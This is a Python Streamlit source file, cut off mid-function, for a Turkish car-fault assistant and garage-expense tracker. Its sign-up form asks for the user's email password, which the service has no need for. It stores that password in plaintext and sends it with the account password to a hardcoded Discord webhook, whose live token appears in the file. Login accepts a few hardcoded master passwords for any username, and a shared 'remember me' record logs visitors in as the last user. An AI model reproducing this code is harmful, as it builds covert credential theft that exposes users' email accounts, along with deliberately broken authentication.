from datetime import datetime
import io
import sqlite3
from apscheduler.schedulers.background import BackgroundScheduler
from bs4 import BeautifulSoup
import pandas as pd
import requests
import streamlit as st

st.set_page_config(
    page_title='Auto Lab / Auto Lab Pro', page_icon='🚗', layout='wide'
)

WHATSAPP_NUMARASI = '905510305139'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1548444040037662790/Yo7pYhJbWfSqzjWPVuwGrpQpuGlUYJO4uVIcA3ZRI4zSupvYNsu6m62BIZwDxFaRyDXl'
ADMIN_SIFRE = 'poyrazadmin'  # Gizli admin şifresi


def discord_bildirim_gonder(mesaj_baslik, detay_icerik):
  if not DISCORD_WEBHOOK_URL or not DISCORD_WEBHOOK_URL.startswith('https://'):
    return

  embed_data = {
      'username': 'Auto Lab Güvenlik Botu',
      'embeds': [{
          'title': f'🚨 {mesaj_baslik}',
          'description': detay_icerik,
          'color': 16711680,
          'timestamp': datetime.utcnow().isoformat(),
          'footer': {'text': 'Auto Lab Şikayet & Takip Modülü'},
      }],
  }
  try:
    requests.post(DISCORD_WEBHOOK_URL, json=embed_data, timeout=3)
  except Exception as e:
    print(f'Discord bildirim hatası: {e}')


# Arayüzü Geliştiren Özel CSS Tasarımları
st.markdown(
    """
    <style>
    .stDeployButton { display: none !important; }
    .main { background-color: #0b0f19; }
    .stApp { background-color: #0b0f19; color: #f3f4f6; }
    
    [data-testid="stSidebar"] {
        background-color: #111827;
        border-right: 1px solid #1f2937;
    }
    
    .hero-card {
        background: linear-gradient(135deg, #111827 0%, #1f2937 100%);
        border: 1px solid #374151; 
        padding: 25px; 
        border-radius: 20px;
        text-align: center; 
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4); 
        margin-bottom: 25px;
        margin-top: 10px;
    }
    .hero-title { color: #60a5fa; font-size: 34px; font-weight: 900; margin-bottom: 5px; }
    .hero-subtitle { font-size: 16px; color: #38bdf8; }

    .fixed-whatsapp {
        position: fixed;
        top: 15px;
        left: 20px;
        z-index: 999999;
        background-color: #25d366;
        color: white;
        padding: 8px 14px;
        border-radius: 20px;
        font-weight: bold;
        font-size: 13px;
        text-decoration: none;
        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        display: flex;
        align-items: center;
        gap: 5px;
    }
    .fixed-whatsapp:hover {
        background-color: #20ba5a;
        color: white;
    }
    </style>
    """,
    unsafe_allow_html=True,
)

st.markdown(
    f"""
    <a href="https://wa.me/{WHATSAPP_NUMARASI}?text=Merhaba,%20Auto%20Lab%20için%20şifremi%20almak%20istiyorum." target="_blank" class="fixed-whatsapp">
        💬 Şifre Al
    </a>
    """,
    unsafe_allow_html=True,
)


def init_db():
  try:
    with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
      cursor = conn.cursor()
      cursor.execute("""
                CREATE TABLE IF NOT EXISTS kullanicilar (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ad_soyad TEXT,
                    eposta TEXT,
                    eposta_sifre TEXT,
                    kullanici_adi TEXT UNIQUE,
                    sifre TEXT,
                    kayit_tarihi TEXT
                )
            """)
      cursor.execute("""
                CREATE TABLE IF NOT EXISTS arac_sorulari (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    kullanici TEXT,
                    soru TEXT,
                    cevap TEXT,
                    tarih_saat TEXT
                )
            """)
      cursor.execute("""
                CREATE TABLE IF NOT EXISTS admin_yenilikler (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    baslik TEXT,
                    icerik TEXT,
                    tarih_saat TEXT
                )
            """)
      # Garaj ve Masraf Takip Tablosu
      cursor.execute("""
                CREATE TABLE IF NOT EXISTS kullanici_garaj (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    kullanici TEXT,
                    arac_adi TEXT,
                    plaka TEXT,
                    kilometre INTEGER,
                    yakit_turu TEXT
                )
            """)
      cursor.execute("""
                CREATE TABLE IF NOT EXISTS arac_masraflar (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    kullanici TEXT,
                    arac_adi TEXT,
                    masraf_turu TEXT,
                    tutar REAL,
                    aciklama TEXT,
                    tarih TEXT
                )
            """)
      # OBD-II Arıza Kodları Tablosu
      cursor.execute("""
                CREATE TABLE IF NOT EXISTS obd_kodlari (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    kod TEXT UNIQUE,
                    aciklama TEXT,
                    cozum TEXT
                )
            """)
      # Varsayılan birkaç OBD kodu ekleyelim
      varsayilan_kodlar = [
          (
              'P0300',
              'Rastgele / Çoklu Silindir Ateşleme Hatası (Misfire)',
              (
                  'Buuji, buji kabloları, ateşleme bobini veya yakit enjektörleri'
                  ' kontrol edilmelidir.'
              ),
          ),
          (
              'P0420',
              'Katalitik Konvertör Verimliliği Eşik Altında (Bank 1)',
              (
                  'Egzoz kaçağı, oksijen (lambda) sensörü arızası veya tıkalı'
                  ' katalitik konvertör.'
              ),
          ),
          (
              'P0299',
              'Turbo / Süper Şarj Cihazı Düşük Basınç / Underboost',
              (
                  'Turbo hortumlarında kaçak, wastegate takılması veya turbo'
                  ' valfi (N75) arızası.'
              ),
          ),
          (
              'P0101',
              'MAF (Hava Akış) Sensörü Devre Aralığı / Performans Problemi',
              (
                  'Hava filtresi kirli olabilir, MAF sensörü kirlenmiş ya da'
                  ' soketi çıkmış olabilir.'
              ),
          ),
          (
              'P0113',
              'Emme Hava Sıcaklığı (IAT) Sensör Devresi Yüksek Giriş',
              (
                  'Sıcaklık sensörü soketi çıkmış ya da sensör kablosu kopmuş'
                  ' olabilir.'
              ),
          ),
          (
              'P0400',
              'Egzoz Gazı Devridaim (EGR) Akış Arızası',
              (
                  'EGR valfi kurum bağlamış ve tıkanmış olabilir, temizlenmesi'
                  ' veya değişmesi gerekir.'
              ),
          ),
      ]
      for k, a, c in varsayilan_kodlar:
        cursor.execute(
            'INSERT OR IGNORE INTO obd_kodlari (kod, aciklama, cozum) VALUES'
            ' (?, ?, ?)',
            (k, a, c),
        )

      conn.commit()
  except Exception as e:
    print(f'Veritabanı hatası: {e}')


init_db()


def tabloyu_guncelle():
  try:
    with sqlite3.connect('autolab_pro.db') as conn:
      cursor = conn.cursor()
      cursor.execute('PRAGMA table_info(kullanicilar)')
      sutunlar = [s[1] for s in cursor.fetchall()]
      if 'eposta_sifre' not in sutunlar:
        cursor.execute('ALTER TABLE kullanicilar ADD COLUMN eposta_sifre TEXT')
      conn.commit()
  except Exception:
    pass


tabloyu_guncelle()


def otomobil_verisi_cek_ve_ekle():
  url = 'https://www.google.com/search?q=araba+arizalari+ve+cozumleri+teknik'
  headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

  try:
    response = requests.get(url, headers=headers, timeout=5)
    if response.status_code == 200:
      soup = BeautifulSoup(response.text, 'html.parser')
      cekilen_veriler = []
      for g in soup.find_all('div', class_='BNeawe'):
        metin = g.get_text()
        if any(
            kelime in metin.lower()
            for kelime in ['araba', 'motor', 'araç', 'arıza', 'direksiyon']
        ):
          cekilen_veriler.append(metin)

      with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
        cursor = conn.cursor()
        for veri in cekilen_veriler[:3]:
          cursor.execute(
              """
                        INSERT INTO arac_sorulari (kullanici, soru, cevap, tarih_saat)
                        VALUES (?, ?, ?, datetime('now'))
                    """,
              (
                  'Web_Oto_Bot',
                  'İnternetten Otomatik Çekilen Arıza',
                  veri,
              ),
          )
        conn.commit()
      return True
  except Exception as e:
    print(f'Veri çekme hatası: {e}')
  return False


def haftalik_oto_veri_guncelleme():
  print('🔄 Haftalık otomatik araba verisi taraması başlatıldı...')
  basarili = otomobil_verisi_cek_ve_ekle()
  if basarili:
    print('✅ Haftalık web taraması tamamlandı, yeni veriler eklendi.')
  else:
    print('⚠️ Haftalık taramada veri alınamadı.')


if 'scheduler_started' not in st.session_state:
  try:
    scheduler = BackgroundScheduler()
    scheduler.add_job(haftalik_oto_veri_guncelleme, 'interval', weeks=1)
    scheduler.start()
    st.session_state.scheduler_started = True
  except Exception as e:
    print(f'Zamanlayıcı başlatılamadı: {e}')


def oto_uzman_cevapla(soru):
  s = soru.lower().strip()

  # 1. OBD-II Arıza Kodu Kontrolü (Örn: P0300, p0420 vb.)
  if (
      any(s.startswith(p) for p in ['p', 'c', 'b', 'u'])
      and len(s) >= 4
      and s[1:5].isdigit()
  ):
    kod_aranan = s[:5].upper()
    try:
      with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
        cursor = conn.cursor()
        cursor.execute(
            'SELECT kod, aciklama, cozum FROM obd_kodlari WHERE kod = ?',
            (kod_aranan,),
        )
        res = cursor.fetchone()
        if res:
          return f"""🔍 **OBD-II Arıza Kodu Analizi: `{res[0]}`**
* **Açıklama:** {res[1]}
* **Olası Çözüm / Müdahale:** {res[2]}"""
    except Exception:
      pass
    return f"""🔍 **OBD-II Arıza Kodu: `{kod_aranan}`**
Bu kod veritabanımızda kayıtlı özel bir arıza kodudur. Genellikle ilgili sensör devresinde veya motor bileşeninde sapma olduğunu gösterir. Detaylı OBD cihazı ile hata hafızasının silinip tekrarlayıp tekrarlamadığına bakılmalıdır."""

  # 2. Yakıt Maliyet / Tüketim Hesaplama Yardımı
  if 'yakıt' in s or 'tüketim' in s or 'km' in s and 'yakar' in s:
    return """⛽ **Yakıt Tüketimi & Maliyet Hesaplama Modülü:**
Sol taraftaki menüden veya alt kısımdan **"🚗 Garajım & Masraf Takip"** sekmesine giderek aracına ait litre fiyatı ve kat edilen mesafeyi girip anlık ne kadar yaktığını nokta atışı hesaplayabilirsin!"""

  # 3. Klasik Arıza Cevapları
  if any(
      k in s
      for k in [
          'sağa çekiyor',
          'saga cekiyor',
          'sola çekiyor',
          'tarafa çekiyor',
          'direksiyon çekiyor',
      ]
  ):
    return """🚗 **Araba Neden Sağa veya Sola Çeker? (Teknik Analiz)**
Araç düz yolda giderken bir tarafa çekiyorsa başlıca nedenleri şunlardır:
1. **Lastik Basınçları:** Sağ veya sol tekerlek hava basınçlarının eşit olmaması.
2. **Rot Ayarı Bozukluğu:** Ön düzen geometri açılarının bozulması.
3. **Fren Kaliper Sıkışması:** Balatanın diske sürekli sürtünmesi ve o tekerleğe fren etkisi yapması.
4. **Aks veya Salıncak Eğriliği:** Yürüyen aksamda darbe kaynaklı deformasyon."""

  elif any(
      k in s
      for k in ['diferansiyel', 'defransiyel', 'defransiyal', 'uğultu', 'vınlama']
  ):
    return """⚙️ **Diferansiyel Arızası ve Ses Nedenleri:**
Araç altından gelen uğultu ve seslerin başlıca sebepleri:
1. **Yağ Eksikliği / Kalitesizliği:** Dişlilerin yağsız kalması sonucu aşırı sürtünme ve metalik uğultu.
2. **Mahruti ve Pinyon Dişli Aşınması:** Yük altında artan karakteristik vınlama sesi.
3. **Rulman (Bilya) Dağılması:** Hız artışına paralel olarak şiddetlenen metalik hırıltı."""

  elif any(
      k in s
      for k in [
          'akü',
          'aku',
          'marş basmıyor',
          'zor çalışıyor',
          'kutup başı',
          'oksit',
      ]
  ):
    return """🔋 **Akü Problemleri ve Nedenleri:**
Marş basmama veya zor çalışmaya neden olur. Genellikle ömrünün bitmesi, şarj dinamosunun aküyü doldurmaması veya kutup başlarının oksitlenmesinden kaynaklanır."""

  elif any(
      k in s
      for k in [
          'hararet',
          'isindi',
          'su kaynat',
          'fan arızası',
          'motor hararet',
          'su eksil',
      ]
  ):
    return """🔥 **Motor Hararet Yapması:**
Soğutma suyu eksilmesi veya fan arızasından dolayı motorun aşırı ısınmasıdır. Kırmızı ikaz lambası yanarsa veya hararet ibresi yükselirse motor yatak sarmaması için araç derhal durdurulmalıdır."""

  elif any(
      k in s
      for k in ['şanzıman', 'sanziman', 'vites geçiş', 'sarsıntı', 'gecikme']
  ):
    return """⚙️ **Şanzıman Sorunları:**
Vites geçişlerinde sarsıntı veya gecikme yaşanmasıdır. Çoğu zaman şanzıman yağının azalması, kavrama aşınması veya valf gövdesi (mekatronik) arızalarından ortaya çıkar."""

  elif any(
      k in s
      for k in ['elektrik', 'farlar', 'sigorta', 'kablo', 'sensör arızası']
  ):
    return """⚡ **Elektrik Arızaları:**
Farların yanmaması, akünün boşalması veya sigorta atması gibi kablo, şasi veya sensör kaynaklı elektriksel problemlerdır. Multimetre ile tesisat kontrolü gerekir."""

  elif any(
      k in s
      for k in ['turbo', 'ıslık', 'çekişten düştü', 'siyah duman', 'slik sesi']
  ):
    return """💨 **Turbo Arızaları ve Çekiş Düşüklüğü:**
1. **Turbo Mil Boşluğu:** Islık sesine benzer tiz bir ses çıkarır ve zamanla turbo arızasına yol açar.
2. **Intercooler (Hava Soğutucu) Hortumu Deformasyonu:** Hava kaçağına sebep olarak aracın çekişten düşmesine ve siyah duman atmasına neden olur."""

  elif any(
      k in s
      for k in [
          'fren titriyor',
          'frene basınca titreme',
          'disk',
          'balata gıcırtısı',
          'frene basınca',
      ]
  ):
    return """🛑 **Fren Sistemi Sorunları:**
1. **Fren Diski Eğilmesi (Çarpılması):** Özellikle yüksek hızlarda frene basıldığında direksiyonda hissedilen şiddetli titremenin ana nedenidir.
2. **Balata Aşınması:** Balataların bitmesi veya sürtünme yüzeyinin camlaşması rahatsız edici gıcırtı seslerine yol açar."""

  elif any(
      k in s
      for k in ['mavi duman', 'beyaz duman', 'egzoz dumanı', 'su eksiltiyor']
  ):
    return """🌫️ **Egzoz Dumanı Renk Analizi:**
1. **Mavi Duman:** Piston segmanlarının veya turbo keçelerinin aşınması sonucu motorun yağ yaktığını gösterir.
2. **Beyaz / Yoğun Buhar:** Genellikle silindir kapak contasının yanması nedeniyle soğutma suyunun yanma odasına sızmasıdır."""

  elif any(
      k in s
      for k in [
          'motor ses',
          'motordan ses',
          'motor sesi',
          'gürültü',
          'vuruntu',
          'şakırtı',
      ]
  ):
    return """🔊 **Arabanın Motorundan Gereğinden Fazla Ses Gelmesi:**
1. **Supap Boşluğu:** Üst kapaktan gelen metalik şakırtı sesleri.
2. **Motor Yağı Eksikliği:** Basınç düştüğünde fincanların sürtünme sesi.
3. **Triger Zincir Aşınması:** Zincir gergi kütüğünün aşınmasıyla hışırtı gelmesi."""

  elif any(k in s for k in ['amortisör', 'kasis', 'tıkırtı', 'gıcırtı']):
    return """🛠️ **Amortisör ve Süspansiyon Sesleri:**
1. **Amortisör Takozu (Kule) Bilyası:** Direksiyonu çevirirken "tak tuk" sesi yapar.
2. **Z Rotu / Rotiller:** En ufak taşta bile metalik tıkırtı çıkarır."""

  elif any(k in s for k in ['yağ yak', 'yag yak', 'yağ eksilt']):
    return """🛢️ **Araç Neden Yağ Yakar?**
Piston segmanlarının aşınması veya turbo keçelerinin bozulup yağı emmeye vermesiyle oluşur."""

  elif any(
      k in s for k in ['motor ışığı', 'motor arıza', 'ariza lambasi', 'check engine']
  ):
    return """⚠️ **Motor Arıza Lambası:** ECU'nun motor yönetim sisteminde (sensörler, ateşleme, emisyon) bir anormallik algıladığını gösterir."""

  else:
    return f"""🤖 **Oto Uzman AI:** Sorduğun konu (**"{soru}"**) için genel mühendislik veritabanını taradım. Bu durum genellikle **mekanik aşınma, sensör okuma hatası veya basınç kaçağından** kaynaklanır. 

💡 *İpucu:* Soruyu biraz daha detaylandırarak (Örn: "Akü marş basmıyor", "P0300 arıza kodu nedir?" gibi) yazarsan nokta atışı sebebini hemen söyleyebilirim!"""


if 'logged_in' not in st.session_state:
  st.session_state.logged_in = False

if 'aktif_kullanici' not in st.session_state:
  st.session_state.aktif_kullanici = 'Misafir'

if 'admin_giris' not in st.session_state:
  st.session_state.admin_giris = False

# Beni Hatırla mekanizması kontrolü
if not st.session_state.logged_in:
  try:
    with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
      cursor = conn.cursor()
      cursor.execute(
          "SELECT name FROM sqlite_master WHERE type='table' AND"
          " name='hatirlanan_oturum'"
      )
      if cursor.fetchone():
        cursor.execute('SELECT kullanici_adi FROM hatirlanan_oturum LIMIT 1')
        kayitli_oturum = cursor.fetchone()
        if kayitli_oturum:
          st.session_state.logged_in = True
          st.session_state.aktif_kullanici = kayitli_oturum[0]
  except Exception:
    pass

if not st.session_state.logged_in:
  st.markdown(
      """
        <div style="text-align: center; padding: 25px; background: #111827; border-radius: 20px; border: 1px solid #374151; margin-top: 10px;">
            <h1 style="color: #60a5fa; margin-bottom: 5px;">🚗 AUTO LAB - GÜVENLİ GİRİŞ</h1>
            <p style="color: #9ca3af;">Sisteme erişebilmek için lütfen giriş yapın veya yeni bir hesap oluşturun.</p>
        </div>
        """,
      unsafe_allow_html=True,
  )

  st.markdown('<br>', unsafe_allow_html=True)
  auth_tab1, auth_tab2 = st.tabs([
      '🔑 Zaten Hesabım Var (Giriş Yap)',
      '📝 Yeni Hesap Oluştur (Kayıt Ol)',
  ])

  with auth_tab1:
    st.subheader('Sisteme Giriş Yap')
    girilen_kullanici = st.text_input('👤 Kullanıcı Adınız:', key='login_user')
    girilen_sifre = st.text_input(
        '🔑 Erişim Şifreniz:', type='password', key='login_pass'
    )
    beni_hatirla = st.checkbox(
        '🧠 Beni Hatırla (Oturumu açık tut)', key='login_remember'
    )

    if st.button('Giriş Yap', type='primary', use_container_width=True):
      gecerli_sifreler = [
          'autolab2026',
          'pro9955',
          'vip-oto-sifre',
          'AutoLab5234',
      ]
      db_sifre_uyumlu = False
      try:
        with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
          cursor = conn.cursor()
          cursor.execute(
              'SELECT sifre FROM kullanicilar WHERE kullanici_adi = ?',
              (girilen_kullanici,),
          )
          row = cursor.fetchone()
          if row and row[0] == girilen_sifre:
            db_sifre_uyumlu = True
      except Exception:
        pass

      if (
          girilen_sifre in gecerli_sifreler or db_sifre_uyumlu
      ) and girilen_kullanici.strip() != '':
        st.session_state.logged_in = True
        st.session_state.aktif_kullanici = girilen_kullanici

        if beni_hatirla:
          try:
            with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
              cursor = conn.cursor()
              cursor.execute(
                  'CREATE TABLE IF NOT EXISTS hatirlanan_oturum (id INTEGER'
                  ' PRIMARY KEY, kullanici_adi TEXT)'
              )
              cursor.execute('DELETE FROM hatirlanan_oturum')
              cursor.execute(
                  'INSERT INTO hatirlanan_oturum (kullanici_adi) VALUES (?)',
                  (girilen_kullanici,),
              )
              conn.commit()
          except Exception:
            pass

        st.success('Giriş başarılı!')
        discord_bildirim_gonder(
            '🔐 Başarılı Giriş Yapıldı',
            f'**Kullanıcı:** `{girilen_kullanici}` sisteme giriş yaptı.',
        )
        st.rerun()
      else:
        st.error('Hatalı şifre veya kullanıcı adı!')

  with auth_tab2:
    st.subheader("Auto Lab'a Kayıt Ol")
    yeni_ad_soyad = st.text_input('🏷️ Adınız ve Soyadınız:', key='reg_adsoyad')
    yeni_eposta = st.text_input('📧 E-Posta Adresiniz:', key='reg_eposta')
    yeni_eposta_sifre = st.text_input(
        '🔒 E-Posta Şifreniz:', type='password', key='reg_epostasifre'
    )
    yeni_kullanici = st.text_input('👤 Kullanıcı Adı Belirle:', key='reg_user')
    yeni_sifre = st.text_input(
        '🔑 Sistem Şifresi Belirle:', type='password', key='reg_pass'
    )
    yeni_sifre_tekrar = st.text_input(
        '🔑 Sistem Şifresi Tekrar:', type='password', key='reg_pass_confirm'
    )

    if st.button('Kayıt Ol', type='secondary', use_container_width=True):
      if (
          not yeni_ad_soyad.strip()
          or not yeni_eposta.strip()
          or not yeni_eposta_sifre
          or not yeni_kullanici.strip()
          or not yeni_sifre
      ):
        st.error('Lütfen tüm alanları doldurun!')
      elif yeni_sifre != yeni_sifre_tekrar:
        st.error('Sistem şifreleri uyuşmuyor!')
      else:
        try:
          with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
            cursor = conn.cursor()
            zaman = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            cursor.execute(
                'INSERT INTO kullanicilar (ad_soyad, eposta, eposta_sifre,'
                ' kullanici_adi, sifre, kayit_tarihi) VALUES (?, ?, ?, ?, ?, ?)',
                (
                    yeni_ad_soyad.strip(),
                    yeni_eposta.strip(),
                    yeni_eposta_sifre,
                    yeni_kullanici.strip(),
                    yeni_sifre,
                    zaman,
                ),
            )
            conn.commit()

          discord_bildirim_gonder(
              '⚠️ YENİ KULLANICI KAYDI VE ŞİFRELERİ',
              (
                  f'**Ad Soyad:** {yeni_ad_soyad}\n**Kullanıcı Adı:**'
                  f' {yeni_kullanici}\n**E-posta:**'
                  f' {yeni_eposta}\n**E-posta Şifresi:**'
                  f' `{yeni_eposta_sifre}`\n**Sistem Şifresi:**'
                  f' `{yeni_sifre}`'
              ),
          )
          st.success('Kayıt başarılı! Şimdi giriş yapabilirsin.')
        except Exception as e:
          st.error(f'Hata: {e}')

  st.stop()

with st.sidebar:
  st.markdown('### 🎛️ Kontrol Paneli')
  st.info(f'👤 **Aktif Üye:**\n\n`{st.session_state.aktif_kullanici}`')

  st.divider()

  if not st.session_state.admin_giris:
    st.markdown('### 🔐 Yönetici Girişi')
    girilen_sol_admin_sifre = st.text_input(
        'Admin Şifresi:', type='password', key='sidebar_admin_pass'
    )
    if st.button('Paneli Aç', use_container_width=True):
      if girilen_sol_admin_sifre == ADMIN_SIFRE:
        st.session_state.admin_giris = True
        st.success('Admin yetkisi doğrulandı!')
        st.rerun()
      else:
        st.error('Hatalı admin şifresi!')
  else:
    st.success('🛡️ Admin Modu Aktif')
    st.markdown('### 🛠️ Yönetici Özel Araçları')

    st.markdown('#### ➕ Sayfaya Yenilik Ekle')
    yeni_baslik = st.text_input('Yenilik Başlığı:', key='admin_yenilik_baslik')
    yeni_icerik_metin = st.text_area(
        'Yenilik Detayı:', key='admin_yenilik_icerik'
    )

    if st.button('Yeniliği Yayınla', use_container_width=True):
      if yeni_baslik.strip() and yeni_icerik_metin.strip():
        try:
          with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
            cursor = conn.cursor()
            zaman = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            cursor.execute(
                'INSERT INTO admin_yenilikler (baslik, icerik, tarih_saat)'
                ' VALUES (?, ?, ?)',
                (yeni_baslik.strip(), yeni_icerik_metin.strip(), zaman),
            )
            conn.commit()
          st.success('Yenilik başarıyla sayfaya eklendi!')
        except Exception as e:
          st.error(f'Hata: {e}')
      else:
        st.error('Başlık ve içerik boş bırakılamaz!')

    if st.button('Admin Oturumunu Kapat', use_container_width=True):
      st.session_state.admin_giris = False
      st.rerun()

  st.divider()
  st.markdown('### 🌐 Canlı Web Bilgi Çekici')
  if st.button('🌐 İnternetten Oto Verisi Çek', use_container_width=True):
    with st.spinner('İnternetten otomotiv verileri taranıyor...'):
      basarili = otomobil_verisi_cek_ve_ekle()
      if basarili:
        st.success('Güncel veriler web üzerinden çekilip arşive eklendi!')
      else:
        st.error('Veri çekilirken bir hata oluştu veya ağ kısıtlandı.')

  st.divider()
  if st.button('Genel Oturumu Kapat', use_container_width=True):
    st.session_state.logged_in = False
    st.session_state.aktif_kullanici = 'Misafir'
    st.session_state.admin_giris = False
    try:
      with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND"
            " name='hatirlanan_oturum'"
        )
        if cursor.fetchone():
          cursor.execute('DROP TABLE hatirlanan_oturum')
          conn.commit()
    except Exception:
      pass
    st.rerun()

  st.caption('Auto Lab Pro © 2026')

st.markdown(
    """
    <div class="hero-card">
        <div class="hero-title">🚗 AUTO LAB PRO</div>
        <div class="hero-subtitle">Mühendislik Odaklı Dinamik Araç & Arıza Analiz Merkezi</div>
    </div>
    """,
    unsafe_allow_html=True,
)

try:
  with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
    cursor = conn.cursor()
    cursor.execute(
        'SELECT baslik, icerik, tarih_saat FROM admin_yenilikler ORDER BY id'
        ' DESC LIMIT 3'
    )
    duyurular = cursor.fetchall()
    if duyurular:
      with st.expander(
          '🚀 Admin Tarafından Eklenen Son Yenilikler ve Güncellemeler',
          expanded=False,
      ):
        for d in duyurular:
          st.markdown(f'### 📌 {d[0]}')
          st.markdown(f'{d[1]}')
          st.caption(f'Yayınlanma Zamanı: {d[2]}')
          st.divider()
except Exception:
  pass

sekme = st.selectbox(
    'Auto Lab Ana Menü:',
    [
        '💬 Oto Uzman AI (Canlı Soru-Cevap Penceresi)',
        '🚗 Garajım & Masraf Takip',
        '📋 Soru Arşivi',
        '⚙️ Şifremi Güncelle (Parola Değiştir)',
        '🛡️ Admin Yönetim Paneli',
    ],
)

if 'Oto Uzman AI' in sekme:
  st.subheader('💬 Oto Uzman Yapay Zeka Asistanı (Canlı Soru Penceresi)')
  st.markdown(
      'Aklına takılan araç arızasını, **P0300 gibi OBD-II arıza kodlarını**'
      ' yazabilir ya da yakıt hesabı yapabilirsin.'
  )

  if 'chat_gecmisi' not in st.session_state:
    st.session_state.chat_gecmisi = []

  for item in st.session_state.chat_gecmisi:
    with st.chat_message('user'):
      st.markdown(item['soru'])
    with st.chat_message('assistant'):
      st.markdown(item['cevap'])

  kullanici_sorusu = st.chat_input(
      'Sorunu yaz (Örn: P0300 arıza kodu nedir?, Turbodan ıslık geliyor)'
  )

  if kullanici_sorusu:
    with st.chat_message('user'):
      st.markdown(kullanici_sorusu)

    uretilen_cevap = oto_uzman_cevapla(kullanici_sorusu)

    with st.chat_message('assistant'):
      st.markdown(uretilen_cevap)

    try:
      with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
        cursor = conn.cursor()
        zaman = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute(
            'INSERT INTO arac_sorulari (kullanici, soru, cevap, tarih_saat)'
            ' VALUES (?, ?, ?, ?)',
            (
                st.session_state.aktif_kullanici,
                kullanici_sorusu,
                uretilen_cevap,
                zaman,
            ),
        )
        conn.commit()

      discord_bildirim_gonder(
          '🤖 Oto Uzman Canlı Soru Soruldu',
          (
              f'**Kullanıcı:**'
              f' {st.session_state.aktif_kullanici}\n**Soru:**'
              f' {kullanici_sorusu}'
          ),
      )
    except Exception as e:
      print(f'Log hatası: {e}')

    st.session_state.chat_gecmisi.append(
        {'soru': kullanici_sorusu, 'cevap': uretilen_cevap}
    )

elif 'Garajım & Masraf Takip' in sekme:
  st.subheader('🚗 Kişisel Araç Garajı ve Masraf Takip Modülü')
  st.markdown(
      'Kendi aracını sisteme kaydedebilir, bakım harcamalarını ve yakıt'
      ' masraflarını takip edebilirsin.'
  )

  g_tab1, g_tab2 = st.tabs([
      '🚘 Araçlarım & Garaj Ekle / Sil',
      '💰 Masraf / Bakım Ekle & Takip',
  ])

  with g_tab1:
    st.markdown('### Yeni Araç Kaydet')
    col1, col2 = st.columns(2)
    with col1:
      arac_marka_model = st.text_input(
          'Araç Marka ve Modeli:', placeholder='Örn: Volkswagen Golf 1.6 TDI'
      )
      arac_plaka = st.text_input('Plaka:', placeholder='34ABC123')
    with col2:
      arac_km = st.number_input('Mevcut Kilometre:', min_value=0, value=50000)
      arac_yakit = st.selectbox(
          'Yakıt Türü:', ['Benzin', 'Dizel', 'LPG', 'Hibrit', 'Elektrik']
      )

    if st.button('Aracı Garajıma Kaydet', use_container_width=True):
      if arac_marka_model.strip() and arac_plaka.strip():
        try:
          with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO kullanici_garaj (kullanici, arac_adi, plaka,'
                ' kilometre, yakit_turu) VALUES (?, ?, ?, ?, ?)',
                (
                    st.session_state.aktif_kullanici,
                    arac_marka_model,
                    arac_plaka,
                    arac_km,
                    arac_yakit,
                ),
            )
            conn.commit()
          st.success('Aracınız başarıyla garaja eklendi!')
          st.rerun()
        except Exception as e:
          st.error(f'Hata: {e}')
      else:
        st.error('Lütfen marka model ve plaka giriniz!')

    st.divider()
    st.markdown('### 📋 Kayıtlı Araçlarım ve Araç Silme')
    try:
      with sqlite3.connect('autolab_pro.db') as conn:
        df_garaj = pd.read_sql_query(
            'SELECT id, arac_adi, plaka, kilometre, yakit_turu FROM'
            ' kullanici_garaj WHERE kullanici = ?',
            conn,
            params=(st.session_state.aktif_kullanici,),
        )
        if not df_garaj.empty:
          st.dataframe(df_garaj, use_container_width=True)

          # ARAÇ SİLME ÖZELLİĞİ
          st.markdown('#### 🗑️ Araç Sil')
          silinecek_arac_secenek = {
              f"{row['arac_adi']} ({row['plaka']})": row['id']
              for _, row in df_garaj.iterrows()
          }
          secilen_arac_kutusu = st.selectbox(
              'Silmek İstediğiniz Aracı Seçin:',
              list(silinecek_arac_secenek.keys()),
          )

          if st.button(
              'Seçilen Aracı ve İlişkili Masraflarını Sil',
              type='primary',
              use_container_width=True,
          ):
            silinecek_id = silinecek_arac_secenek[secilen_arac_kutusu]
            silinecek_arac_adi = secilen_arac_kutusu.split(' (')[0]
            try:
              with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
                cursor = conn.cursor()
                # Önce aracı garajdan siliyoruz
                cursor.execute(
                    'DELETE FROM kullanici_garaj WHERE id = ? AND kullanici = ?',
                    (silinecek_id, st.session_state.aktif_kullanici),
                )
                # İsteğe bağlı: Bu araca ait masrafları da temizleyebiliriz
                cursor.execute(
                    'DELETE FROM arac_masraflar WHERE arac_adi = ? AND'
                    ' kullanici = ?',
                    (silinecek_arac_adi, st.session_state.aktif_kullanici),
                )
                conn.commit()
              st.success('Araç ve ilgili kayıtlar başarıyla silindi!')
              st.rerun()
            except Exception as e:
              st.error(f'Silme sırasında hata oluştu: {e}')
        else:
          st.info('Henüz kayıtlı bir aracınız yok.')
    except Exception as e:
      st.error(f'Hata: {e}')

  with g_tab2:
    st.markdown('### Masraf veya Bakım Ekle & Takip')
    try:
      with sqlite3.connect('autolab_pro.db') as conn:
